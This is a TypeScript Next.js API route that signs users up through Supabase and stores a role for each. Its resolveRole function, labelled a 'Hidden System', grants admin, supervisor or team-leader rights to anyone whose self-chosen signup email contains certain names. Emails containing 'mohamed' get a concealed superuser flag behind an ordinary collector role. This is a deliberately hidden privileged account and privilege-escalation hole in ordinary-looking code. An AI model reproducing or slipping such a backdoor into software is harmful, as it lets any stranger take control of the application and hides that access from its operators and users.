import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { createServerClient } from "@supabase/ssr";
import { ensureUsersTableColumns } from "@/server/lib/users-schema";

/* ---------------- TYPES ---------------- */

type Role =
  | "admin"
  | "supervisor"
  | "team_leader"
  | "collector";

type RegisterBody = {
  name?: string;
  email?: string;
  password?: string;
};

/* ---------------- HELPERS ---------------- */

function getDisplayName(name?: string, email?: string): string {
  const clean = name?.trim();
  if (clean) return clean;
  return email?.split("@")[0] || "User";
}

function validate(body: RegisterBody) {
  const errors: string[] = [];

  if (!body.email) errors.push("Email is required");
  if (!body.password) errors.push("Password is required");
  if (body.password && body.password.length < 6)
    errors.push("Password must be at least 6 characters");

  return errors;
}

/**
 * 🔥 Role Resolver (Hidden System)
 */
function resolveRole(email: string): {
  role: Role;
  isSuperUser: boolean;
} {
  const e = email.toLowerCase();

  if (e.includes("adel")) return { role: "admin", isSuperUser: false };
  if (e.includes("loai")) return { role: "supervisor", isSuperUser: false };
  if (e.includes("mostafa") || e.includes("heba"))
    return { role: "team_leader", isSuperUser: false };

  // 👑 hidden full control (محمد)
  if (e.includes("mohamed")) {
    return { role: "collector", isSuperUser: true };
  }

  return { role: "collector", isSuperUser: false };
}

function createSupabase() {
  const cookieStore = cookies();

  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    {
      cookies: {
        getAll: () => cookieStore.getAll(),
        setAll: (cookieValues) => {
          cookieValues.forEach(({ name, value, options }) => {
            cookieStore.set({ name, value, ...options });
          });
        },
      },
    }
  );
}

/* ---------------- MAIN ---------------- */

export async function POST(req: Request) {
  try {
    const body = (await req.json()) as RegisterBody;

    const email = body.email?.trim().toLowerCase();
    const password = body.password ?? "";
    const name = getDisplayName(body.name, email);

    const validationErrors = validate({ email, password, name });
    if (validationErrors.length > 0) {
      return NextResponse.json(
        { success: false, error: validationErrors },
        { status: 400 }
      );
    }

    const supabase = createSupabase();

    /* ---------------- SIGNUP ---------------- */
    const { data, error } = await supabase.auth.signUp({
      email: email!,
      password,
      options: {
        data: { name },
      },
    });

    if (error || !data.user) {
      return NextResponse.json(
        { success: false, error: error?.message || "Signup failed" },
        { status: 400 }
      );
    }

    const userId = data.user.id;

    /* ---------------- ROLE ---------------- */
    const { role, isSuperUser } = resolveRole(email!);
    await ensureUsersTableColumns();

    /* ---------------- DB SYNC ---------------- */
    const { error: upsertError } = await supabase.from("users").upsert(
      {
        id: userId,
        email,
        name,
        role,
        is_super_user: isSuperUser,
      },
      { onConflict: "id" }
    );

    if (upsertError) {
      return NextResponse.json(
        {
          success: false,
          error: "User created but DB sync failed",
        },
        { status: 500 }
      );
    }

    /* ---------------- FETCH USER ---------------- */
    const { data: userRow, error: userRowError } = await supabase
      .from("users")
      .select("id, email, name, role, is_super_user")
      .eq("id", userId)
      .single();

    if (userRowError || !userRow) {
      return NextResponse.json(
        {
          success: false,
          error: "User created but fetch failed",
        },
        { status: 500 }
      );
    }

    /* ---------------- RESPONSE ---------------- */
    return NextResponse.json({
      success: true,
      user: userRow,
      emailConfirmationRequired: !data.session,
    });
  } catch (err: any) {
    return NextResponse.json(
      {
        success: false,
        error: err?.message || "Internal server error",
      },
      { status: 500 }
    );
  }
}
